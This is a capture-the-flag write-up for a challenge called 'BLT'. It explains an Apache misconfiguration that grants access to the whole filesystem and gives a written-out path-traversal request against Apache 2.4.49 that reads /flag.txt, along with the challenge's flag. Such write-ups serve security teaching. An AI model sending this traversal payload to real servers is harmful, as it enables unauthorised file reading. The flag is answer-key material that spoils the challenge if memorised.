# BLT

## Description

Our company provides services for the development of the most modern software.

Can you check our landing page for vulnerabilities?

Here's our website: **`164.90.201.196:8080/`**

{% file src="../../.gitbook/assets/blt_a559171c04.zip" %}

## Solution

Taking a look at the Dockerfile, we quickly see a misconfiguration in the `apache.conf` file.

```docker
RUN echo "<VirtualHost *:80>\n \
DocumentRoot /var/www/html/\n \
<Directory \"/\">\n \
 Require all granted\n \
</Directory>\n \
</VirtualHost>" > /usr/local/apache2/conf/apache.conf
```

Here, `<Directory />` refers to the _filesystem_ directory, not the web root. Hence, this configuration allows access to any file on the filesystem.

Taking a closer look a the server responses showed that the Apache server is on version 2.4.49, and vulnerable to a recent path traversal zero-day.

![](<../../.gitbook/assets/image (80) (1) (1) (1).png>)

`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` allows us to get the flag at `/flag.txt`.

The flag is `spbctf{th3_lat3st_d03s_n0t_m3an_s3cur3}`
